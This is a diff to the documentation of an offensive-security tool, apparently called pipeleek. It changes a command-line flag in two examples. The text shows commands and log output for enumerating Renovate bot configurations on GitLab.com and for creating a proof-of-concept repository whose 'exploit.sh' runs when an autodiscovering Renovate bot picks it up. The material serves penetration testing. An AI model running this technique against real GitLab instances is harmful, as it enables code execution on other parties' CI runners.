@@ -35,7 +35,7 @@ Use the `enum` command to scan your GitLab instance for Renovate bot jobs and co
 For example, we enumerated Renovate configs found on GitLab.com. One project was found that enables Renovate's autodiscovery of projects and does **not** set any autodiscovery filters.
 
 ```bash
-pipeleek gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
+pipeleek gl renovate enum -u https://gitlab.com -t glpat-[redacted] --dump
 2025-09-30T07:11:06Z info Fetching projects
 2025-09-30T07:11:12Z warn Identified Renovate (bot) configuration autodiscoveryFilterType= autodiscoveryFilterValue= hasAutodiscovery=true hasAutodiscoveryFilters=false hasConfigFile=true pipelines=enabled selfHostedConfigFile=true url=https://gitlab.com/test-group/renovate-bot
 2025-09-30T07:11:16Z info Fetched all projects
@@ -53,7 +53,7 @@ The Renovate bot from the example above is configured to autodiscover new projec
 The following command creates a repository that includes an exploit script called `exploit.sh`. Whenever a Renovate bot picks up this repo, the script will be executed.
 
 ```bash
-pipeleek gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] -v
+pipeleek gl renovate autodiscovery -u https://gitlab.com -t glpat-[redacted] -v
 2025-09-30T07:19:33Z info Created project name=devfe-pipeleek-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleek-renovate-autodiscovery-poc
 2025-09-30T07:19:35Z debug Created file fileName=renovate.json
 2025-09-30T07:19:35Z debug Created file fileName=pom.xml
